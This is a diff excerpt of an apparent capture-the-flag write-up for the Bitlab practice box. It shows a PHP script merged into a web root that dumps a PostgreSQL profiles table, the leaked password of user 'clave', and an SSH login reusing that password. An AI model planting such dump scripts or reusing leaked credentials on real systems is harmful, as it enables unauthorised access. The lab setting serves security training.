-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
 <span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
 <span style="color:#a6e22e">$arr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_fetch_all</span>(<span style="color:#a6e22e">$result</span>);
 <span style="color:#a6e22e">print_r</span>(<span style="color:#a6e22e">$arr</span>);
 </code></pre></div><p>After save and merge of it, we go to <code>http://10.10.10.114/profile/&lt;name you give to the script&gt;</code>, and we should get as a result printed an array with our previous user <code>clave</code> and a password:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Array ( [<span style="color:#ae81ff">0</span>] =&gt; Array ( [<span style="color:#a6e22e">id</span>] =&gt; <span style="color:#ae81ff">1</span> [<span style="color:#a6e22e">username</span>] =&gt; <span style="color:#a6e22e">clave</span> [<span style="color:#a6e22e">password</span>] =&gt; <span style="color:#a6e22e">c3NoLXN0cjBuZy1wQHNz</span><span style="color:#f92672">==</span> ) )
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Array ( [<span style="color:#ae81ff">0</span>] =&gt; Array ( [<span style="color:#a6e22e">id</span>] =&gt; <span style="color:#ae81ff">1</span> [<span style="color:#a6e22e">username</span>] =&gt; <span style="color:#a6e22e">clave</span> [<span style="color:#a6e22e">password</span>] =&gt; <span style="color:#a6e22e">c3NoLXN0cjBuZy1wQHNz</span><span style="color:#f92672">==</span> ) )
 </code></pre></div><p>Before trying to crack the password, we try to use as it is, and indeed it was just that one it was not encrypted!</p>
 <pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
 clave@10.10.10.114's password: 
